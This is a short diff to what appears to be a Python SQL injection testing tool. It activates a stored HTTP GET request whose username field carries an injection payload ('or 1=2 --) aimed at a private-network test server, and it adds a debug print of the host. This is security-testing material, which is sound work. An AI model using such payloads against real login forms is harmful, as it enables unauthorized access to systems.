@@ -43,17 +43,17 @@ Connection: keep-alive
 
 # ############################################### GET 방식 ###############################################
 
-# REQUEST_STRING = """
-# GET /?username='or+1=2+--+&password=1 HTTP/1.1
-# host: 192.168.219.100:5001
-# Upgrade-Insecure-Requests: 1
-# User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
-# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-# Referer: http://192.168.219.100:5001/?username=&password=
-# Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
-# Connection: keep-alive
+REQUEST_STRING = """
+GET /?username='or+1=2+--+&password=1 HTTP/1.1
+host: 192.168.219.100:5001
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.219.100:5001/?username=&password=
+Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: keep-alive
 
-# # """
+"""
 
 ############################################### POST 방식 ###############################################
 
@@ -249,6 +249,7 @@ def parse_request(request):
 			url = headers['host']
 			condition = url_decode(data[args.parameter])
 
+		print(f"Host : {url}\n")
 	return (
 	{
 		'method': method,
